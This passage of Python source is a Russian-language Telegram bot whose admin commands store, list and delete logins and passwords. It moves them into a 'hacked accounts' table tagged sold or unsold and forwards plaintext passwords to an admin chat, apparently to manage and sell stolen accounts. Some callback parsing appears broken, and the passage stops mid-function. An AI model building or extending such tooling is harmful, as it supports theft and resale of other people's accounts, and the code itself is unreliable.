        c = conn.cursor()
        c.execute("SELECT password FROM credentials WHERE login = %s", (login,))
        result = c.fetchone()
        if not result:
            bot.reply_to(message, "❌ *Логин не найден в базе паролей!*", parse_mode='Markdown')
            logger.warning(f"Логин {login} не найден")
            conn.close()
            return
        password = result[0]
        msg = bot.reply_to(message, "🔒 *Введите новый пароль*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, lambda m: process_hacked_password(m, login, password))
        logger.info(f"Запрошен пароль для {login}")
    except Exception as e:
        logger.error(f"Ошибка логина: {e}")
        bot.reply_to(message, "❌ *Ошибка обработки!*", parse_mode='Markdown')
    finally:
        if conn:
            conn.close()

def process_hacked_password(message, login, old_password):
    chat_id = str(message.chat.id)
    new_password = sanitize_input(message.text)
    logger.info(f"Пароль для {login}: {new_password}")
    if not new_password:
        try:
            bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустой пароль")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("✅ Продан", callback_data=f"hacked_status_sold_{login}_{new_password}"),
        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"hacked_status_not_sold_{login}_{new_password}")
    )
    try:
        bot.reply_to(message, "📊 *Выберите статус аккаунта*:", reply_markup=keyboard, parse_mode='Markdown')
        logger.info(f"Запрошен статус для {login}")
    except Exception as e:
        logger.error(f"Ошибка статуса: {e}")
        bot.reply_to(message, "❌ *Ошибка обработки!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('hacked_status_'))
def handle_hacked_status(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Статус {call.data} от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, access, parse_mode='Markdown')
            logger.warning(f"Доступ запрещён")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        _, status, login, password = call.data.split('_', 3)
        sold_status = "Продан" if status == "sold" else "Непродан"
        conn = get_db_connection()
        if conn is None:
            try:
                bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
                logger.error("База недоступна")
                bot.answer_callback_query(call.id)
            except Exception as e:
                logger.error(f"Ошибка ответа: {e}")
            return
        c = conn.cursor()
        c.execute(
            '''
            INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
            VALUES (%s, %s, %s, %s, %s, %s)
            ON CONFLICT (login) DO UPDATE
            SET password = EXCLUDED.password,
                hack_date = EXCLUDED.hack_date,
                prefix = EXCLUDED.prefix,
                sold_status = EXCLUDED.sold_status,
                linked_chat_id = EXCLUDED.linked_chat_id
            ''',
            (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
        )
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        conn.commit()
        bot.send_message(
            chat_id,
            f"✅ *Аккаунт `{login}` добавлен в hacked!*\n📊 *Статус*: {sold_status}",
            parse_mode='Markdown'
        )
        try:
            bot.send_message(
                ADMIN_CHAT_ID,
                f"💾 *Аккаунт добавлен в hacked*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n📊 *Статус*: {sold_status}\n➕ *Добавил*: {chat_id}",
                parse_mode='Markdown'
            )
            logger.info("Уведомление админу отправлено")
        except Exception as e:
            logger.error(f"Ошибка уведомления админу: {e}")
        logger.info(f"Добавлен: {login}, {sold_status}")
        conn.close()
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка hacked: {e}")
        bot.send_message(chat_id, "❌ *Ошибка добавления!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)

def process_delete_cred(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Удаление: {login} от {chat_id}")
    if not login:
        try:
            bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        if c.rowcount == 0:
            bot.reply_to(message, "❌ *Логин не найден!*", parse_mode='Markdown')
            logger.warning(f"Логин {login} не найден")
        else:
            conn.commit()
            bot.reply_to(message, f"✅ *Пароль для `{login}` удалён!*", parse_mode='Markdown')
            logger.info(f"Удалён: {login}")
    except Exception as e:
        logger.error(f"Ошибка удаления: {e}")
        bot.reply_to(message, "❌ *Ошибка удаления!*", parse_mode='Markdown')
    finally:
        if conn:
            conn.close()

# /admin
@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/admin от {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /admin: {e}")
        return
    users = get_all_users()
    response = (
        "🔧 *Панель администратора*\n\n"
        "👥 *Список пользователей*:\n"
    )
    if not users:
        response += "📭 *Пользователи отсутствуют.*\n"
    else:
        for user_id, prefix, user_name in users:
            user_name = user_name or "Неизвестно"
            response += (
                f"🆔 *Chat ID*: `{user_id}`\n"
                f"👤 *Юзернейм*: @{user_name}\n"
                f"🔑 *Префикс*: `{prefix}`\n\n"
            )
    response += (
        "🔥 *Админ-команды*:\n"
        "💻 /hacked — Просмотр взломанных аккаунты\n"
        "🔑 /passwords — Управление паролями\n"
        "🗄 /database — Управление базой данных\n"
        "🔍 /viewdb — Просмотр базы данных\n"
        "🚨 /techstop — Включить техперерыв\n"
        "✅ /techstopoff — Выключить техперерыв\n"
        "📢 /broadcast — Отправить рассылку\n"
        "👑 /adprefix — Выдать подписку\n"
        "🗑 /delprefix — Сбросить подписку\n"
        "➕ /adduser — Добавить пользователя\n"
        "🔐 /addcred — Добавить пароль\n"
        "💾 /addhacked — Добавить взломанный аккаунт\n"
        "📞 /contact — Связаться с пользователем\n"
        "💬 /messageuser — Отправить сообщение пользователю\n"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /admin: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /viewdb
@bot.message_handler(commands=['viewdb'])
def viewdb_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/viewdb от {chat_id}")
    access = check_access(chat_id, 'viewdb')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /viewdb: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        response = "🗄 *Содержимое базы данных*\n\n"
        
        # Пользователи
        c.execute("SELECT chat_id, prefix, username, subscription_end FROM users")
        users = c.fetchall()
        response += "👥 *Пользователи*:\n"
        if not users:
            response += "📭 Пусто\n"
        for chat_id_db, prefix, username_db, sub_end in users:
            response += (
                f"🆔 `{chat_id_db}`\n"
                f"👤 @{username_db or 'Неизвестно'}\n"
                f"🔑 `{prefix}`\n"
                f"🕒 Подписка до: {sub_end or 'Неизвестно'}\n\n"
            )
        
        # Пароли
        c.execute("SELECT login, password, added_time FROM credentials")
        credentials = c.fetchall()
        response += "🔐 *Пароли*:\n"
        if not credentials:
            response += "📭 Пусто\n"
        for login, password, added_time in credentials:
            response += (
                f"🔑 `{login}`\n"
                f"🔒 `{password}`\n"
                f"🕒 Добавлено: {added_time or 'Неизвестно'}\n\n"
            )
        
        # Взломанные аккаунты
        c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
        hacked = c.fetchall()
        response += "💻 *Взломанные аккаунты*:\n"
        if not hacked:
            response += "📭 Пусто\n"
        for login, password, status, hack_date in hacked:
            response += (
                f"🔑 `{login}`\n"
                f"🔒 `{password}`\n"
                f"📊 `{status}`\n"
                f"🕒 Взломан: {hack_date or 'Неизвестно'}\n\n"
            )
        
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info("База показана")
    except Exception as e:
        logger.error(f"Ошибка /viewdb: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')
    finally:
        if conn:
            conn.close()

# /database
@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/database от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /database: {e}")
        return
    response = (
        "🗄 *Управление базой данных*\n"
        "Выберите действие ниже:"
    )
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("➕ Добавить данные", callback_data="db_add"),
        types.InlineKeyboardButton("🗑 Удалить данные", callback_data="db_delete")
    )
    try:
        bot.reply_to(message, response, reply_markup=keyboard, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /database: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data in ['db_add', 'db_delete'])
def handle_database_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, access, parse_mode='Markdown')
            logger.warning(f"Доступ запрещён")
        except Exception as e:
            logger.error(f"Ошибка кнопки: {e}")
        return
    if call.data == 'db_add':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(
            types.InlineKeyboardButton("💾 В hacked", callback_data="db_add_hacked"),
            types.InlineKeyboardButton("🔐 В credentials", callback_data="db_add_cred"),
            types.InlineKeyboardButton("👤 Пользователь", callback_data="db_add_user")
        )
        try:
            bot.send_message(
                chat_id,
                "➕ *Куда добавить данные?*:",
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошено добавление")
        except Exception as e:
            logger.error(f"Ошибка db_add: {e}")
            bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
    elif call.data == 'db_delete':
        try:
            msg = bot.send_message(chat_id, "📝 *Введите логин для удаления*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_db_delete)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошено удаление")
        except Exception as e:
            logger.error(f"Ошибка db_delete: {e}")
            bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data in ['db_add_hacked', 'db_add_cred', 'db_add_user'])
def handle_db_add_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, access, parse_mode='Markdown')
            logger.warning(f"Доступ запрещён")
        except Exception as e:
            logger.error(f"Ошибка кнопки: {e}")
        return
    if call.data == 'db_add_hacked':
        try:
            msg = bot.send_message(chat_id, "📝 *Введите логин для hacked*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_add_hacked_login)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошен логин для hacked")
        except Exception as e:
            logger.error(f"Ошибка db_add_hacked: {e}")
            bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
    elif call.data == 'db_add_cred':
        try:
            msg = bot.send_message(chat_id, "📝 *Введите логин для credentials*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_add_cred_login)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошен логин для credentials")
        except Exception as e:
            logger.error(f"Ошибка db_add_cred: {e}")
            bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
    elif call.data == 'db_add_user':
        try:
            msg = bot.send_message(
                chat_id,
                "📝 *Введите chat_id и префикс (через пробел)*:",
                parse_mode='Markdown'
            )
            bot.register_next_step_handler(msg, process_add_user)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошено добавление пользователя")
        except Exception as e:
            logger.error(f"Ошибка db_add_user: {e}")
            bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')

def process_db_delete(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Удаление: {login} от {chat_id}")
    if not login:
        try:
            bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
        if c.rowcount == 0:
            bot.reply_to(message, "❌ *Логин не найден!*", parse_mode='Markdown')
            logger.warning(f"Логин {login} не найден")
        else:
            conn.commit()
            bot.reply_to(message, f"✅ *Данные для `{login}` удалены!*", parse_mode='Markdown')
            logger.info(f"Удалён: {login}")
    except Exception as e:
        logger.error(f"Ошибка удаления: {e}")
        bot.reply_to(message, "❌ *Ошибка удаления!*", parse_mode='Markdown')
    finally:
        if conn:
            conn.close()

# /techstop
@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/techstop от {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /techstop: {e}")
        return
    try:
        msg = bot.reply_to(
            message,
            "📝 *Введите причину и длительность техперерыва в часах (через пробел, например: Обновление 2)*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_techstop)
        logger.info(f"Запрошены параметры техперерыва")
    except Exception as e:
        logger.error(f"Ошибка /techstop: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_techstop(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    try:
        reason, hours = sanitize_input(message.text).rsplit(maxsplit=1)
        hours = int(hours)
        if hours <= 0:
            raise ValueError("Длительность должна быть больше 0")
        tech_reason = reason
        tech_end_time = get_current_time() + timedelta(hours=hours)
        tech_mode = True
        response = (
            f"🚨 *Технический перерыв включён!*\n"
            f"📝 *Причина*: {tech_reason}\n"
            f"🕒 *Окончание*: {format_time(tech_end_time)}"
        )
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Техперерыв: {tech_reason}, до {format_time(tech_end_time)}")
    except ValueError as e:
        logger.warning(f"Неверный формат: {e}")
        bot.reply_to(
            message,
            "❌ *Формат: Причина Часы (например: Обновление 2)*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка техперерыва: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /techstopoff
@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    global tech_mode, tech_reason, tech_end_time
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/techstopoff от {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /techstopoff: {e}")
        return
    tech_mode = False
    tech_reason = ""
    tech_end_time = None
    response = "✅ *Технический перерыв отключён!*"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /techstopoff: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /adprefix
@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/adprefix от {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /adprefix: {e}")
        return
    try:
        msg = bot.reply_to(
            message,
            "📝 *Введите chat_id и префикс (через пробел)*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_adprefix)
        logger.info(f"Запрошен префикс")
    except Exception as e:
        logger.error(f"Ошибка /adprefix: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_adprefix(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    try:
        target_id, prefix = sanitize_input(message.text).split(maxsplit=1)
        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
        target_user = get_user(target_id)
        target_username = target_user['username'] if target_user else "Неизвестно"
        save_user(target_id, prefix, subscription_end, target_id, target_username)
        bot.reply_to(
            message,
            f"✅ *Подписка выдана для `{target_id}`!*\n🔑 *Префикс*: `{prefix}`",
            parse_mode='Markdown'
        )
        try:
            bot.send_message(
                target_id,
                f"🎉 *Ваш префикс обновлён!*\n🔑 *Новый префикс*: `{prefix}`\n🕒 *Подписка до*: {subscription_end}",
                parse_mode='Markdown'
            )
            logger.info(f"Уведомление отправлено {target_id}")
        except Exception as e:
            logger.error(f"Ошибка уведомления {target_id}: {e}")
        logger.info(f"Подписка: {target_id}, {prefix}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except ValueError:
        logger.warning("Неверный формат")
        bot.reply_to(
            message,
            "❌ *Формат: chat_id префикс*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка префикса: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /delprefix
@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/delprefix от {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /delprefix: {e}")
        return
    try:
        msg = bot.reply_to(
            message,
            "📝 *Введите chat_id и причину удаления (через пробел, например: 123456 Нарушение)*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_delprefix)
        logger.info(f"Запрошено удаление префикса")
    except Exception as e:
        logger.error(f"Ошибка /delprefix: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_delprefix(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    try:
        target_id, reason = sanitize_input(message.text).rsplit(maxsplit=1)
        target_user = get_user(target_id)
        if not target_user:
            bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
            logger.warning(f"Пользователь не найден: {target_id}")
            return
        target_username = target_user['username'] or "Неизвестно"
        save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id, target_username)
        bot.reply_to(
            message,
            f"✅ *Подписка для `{target_id}` сброшена до `Посетитель`!*\n📝 *Причина*: {reason}",
            parse_mode='Markdown'
        )
        try:
            bot.send_message(
                target_id,
                f"⚠️ *Ваш префикс сброшен до `Посетитель`!*\n📝 *Причина*: {reason}",
                parse_mode='Markdown'
            )
            logger.info(f"Уведомление отправлено {target_id}")
        except Exception as e:
            logger.error(f"Ошибка уведомления {target_id}: {e}")
        logger.info(f"Сброшено: {target_id}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except ValueError:
        logger.warning("Неверный формат")
        bot.reply_to(
            message,
            "❌ *Формат: chat_id причина*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка сброса: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# Продолжение с /adduser
@bot.message_handler(commands=['adduser'])
def adduser_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/adduser от {chat_id}")
    access = check_access(chat_id, 'adduser')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /adduser: {e}")
        return
    try:
        msg = bot.reply_to(
            message,
            "📝 *Введите chat_id и префикс (через пробел, например: 123456 Админ)*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_adduser)
        logger.info(f"Запрошено добавление пользователя от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /adduser: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_adduser(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    try:
        target_id, prefix = sanitize_input(message.text).split(maxsplit=1)
        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
        target_username = get_user(target_id)['username'] if get_user(target_id) else "Неизвестно"
        save_user(target_id, prefix, subscription_end, target_id, target_username)
        response = (
            f"✅ *Пользователь `{target_id}` добавлен!*\n"
            f"🔑 *Префикс*: `{prefix}`\n"
            f"🕒 *Подписка до*: {format_time(datetime.fromisoformat(subscription_end))}"
        )
        bot.reply_to(message, response, parse_mode='Markdown')
        try:
            bot.send_message(
                target_id,
                f"🎉 *Вы добавлены в систему!*\n"
                f"🔑 *Ваш префикс*: `{prefix}`\n"
                f"🕒 *Подписка до*: {format_time(datetime.fromisoformat(subscription_end))}",
                parse_mode='Markdown'
            )
            logger.info(f"Уведомление отправлено {target_id}")
        except Exception as e:
            logger.error(f"Ошибка уведомления {target_id}: {e}")
        logger.info(f"Добавлен пользователь: {target_id}, префикс: {prefix}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except ValueError:
        logger.warning("Неверный формат ввода")
        bot.reply_to(
            message,
            "❌ *Формат: chat_id префикс (например: 123456 Админ)*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка добавления пользователя: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# Новая команда /messageuser для Создателя
@bot.message_handler(commands=['messageuser'])
def messageuser_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/messageuser от {chat_id}")
    access = check_access(chat_id, 'messageuser')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /messageuser: {e}")
        return
    users = get_all_users()
    if not users:
        try:
            bot.reply_to(message, "📭 *Нет пользователей для отправки сообщения!*", parse_mode='Markdown')
            logger.info("Нет пользователей")
        except Exception as e:
            logger.error(f"Ошибка /messageuser: {e}")
        return
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    for user_id, prefix, user_name in users:
        if user_id == chat_id:
            continue  # Пропускаем самого Создателя
        user_name = user_name or "Неизвестно"
        keyboard.add(
            types.InlineKeyboardButton(
                f"@{user_name} ({prefix})",
                callback_data=f"msguser_{user_id}"
            )
        )
    try:
        bot.reply_to(
            message,
            "👥 *Выберите пользователя для отправки сообщения*:",
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        logger.info(f"Показан список пользователей для {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /messageuser: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('msguser_'))
def handle_messageuser_select(call):
    chat_id = str(call.message.chat.id)
    target_id = call.data.replace('msguser_', '')
    logger.info(f"Выбор пользователя {target_id} от {chat_id}")
    try:
        msg = bot.send_message(
            chat_id,
            f"📝 *Введите сообщение для пользователя {target_id}*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, lambda m: process_messageuser_message(m, target_id))
        bot.answer_callback_query(call.id)
        logger.info(f"Запрошено сообщение для {target_id}")
    except Exception as e:
        logger.error(f"Ошибка выбора пользователя: {e}")
        bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)

def process_messageuser_message(message, target_id):
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Сообщение для {target_id}: {text}")
    if not text:
        try:
            bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустое сообщение")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        user = get_user(chat_id)
        sender_name = user['username'] or "Создатель"
        bot.send_message(
            target_id,
            f"📩 *Сообщение от Создателя (@{sender_name})*:\n{text}",
            parse_mode='Markdown'
        )
        bot.reply_to(
            message,
            f"✅ *Сообщение отправлено пользователю {target_id}!*",
            parse_mode='Markdown'
        )
        logger.info(f"Сообщение отправлено {target_id}")
    except Exception as e:
        logger.error(f"Ошибка отправки сообщения: {e}")
        bot.reply_to(message, "❌ *Ошибка отправки сообщения!*", parse_mode='Markdown')

# Завершение /addhacked (из вашего предыдущего запроса)
@bot.message_handler(commands=['addhacked'])
def addhacked_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/addhacked от {chat_id}")
    access = check_access(chat_id, 'addhacked')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /addhacked: {e}")
        return
    try:
        msg = bot.reply_to(
            message,
            "📝 *Введите логин для взломанного аккаунта*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_add_hacked_login)
        logger.info(f"Запрошен логин для /addhacked от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /addhacked: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_add_hacked_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин: {login} от {chat_id}")
    if not login:
        try:
            bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        msg = bot.reply_to(message, "🔒 *Введите пароль*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, lambda m: process_add_hacked_password(m, login))
        logger.info(f"Запрошен пароль для {login}")
    except Exception as e:
        logger.error(f"Ошибка логина: {e}")
        bot.reply_to(message, "❌ *Ошибка запроса!*", parse_mode='Markdown')

def process_add_hacked_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"Пароль для {login}")
    if not password:
        try:
            bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустой пароль")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("✅ Продан", callback_data=f"add_hacked_status_sold_{login}_{password}"),
        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"add_hacked_status_not_sold_{login}_{password}")
    )
    try:
        bot.reply_to(
            message,
            "📊 *Выберите статус аккаунта*:",
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        logger.info(f"Запрошен статус для {login}")
    except Exception as e:
        logger.error(f"Ошибка статуса: {e}")
        bot.reply_to(message, "❌ *Ошибка запроса статуса!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('add_hacked_status_'))
def handle_add_hacked_status(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Обработка статуса {call.data} от {chat_id}")
    access = check_access(chat_id, 'addhacked')
    if access:
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, access, parse_mode='Markdown')
            logger.warning(f"Доступ запрещён для {chat_id}")
        except Exception as e:
